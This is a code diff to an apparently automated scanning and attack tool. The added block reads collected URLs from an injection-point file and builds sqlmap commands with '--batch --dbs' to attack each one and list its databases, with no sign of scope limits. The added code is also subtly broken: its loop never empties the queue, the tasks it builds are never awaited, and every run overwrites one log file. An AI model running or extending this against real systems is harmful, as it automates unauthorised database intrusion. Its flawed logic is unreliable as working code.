@@ -351,6 +351,23 @@ async def main(output_queue):
                     for api_call in api_calls:
                         api_file = os.path.join(outputs, f"{outputs}/attacks/Injectpoints.txt")
                         await write_file(api_file, api_call, append=True)
+                        injects = f"{outputs}/attacks/Injectpoints.txt"
+                        inject_urls = read_urls_from_file(injects)
+                        
+                        # Create a injection point list
+                        inject_queue = asyncio.Queue()
+                        for url in inject_urls:
+                            await inject_queue.put(url)
+                            
+                        # Attack injection points
+                        while not inject_queue.empty():
+                            
+                            inject_tasks = []
+                            for AttackPoint in inject_urls:
+                                inject_command = f'sqlmap -u {AttackPoint} --batch --dbs > {outputs}/attacks/sqlmap_output.log 2>&1'
+                                inject_tasks.extend([run_command(inject_command, output_queue=output_queue, log_file=log_file)])
+            
+            
 
         # Run directory enumeration tasks concurrently
         await asyncio.gather(*dir_enum_tasks)
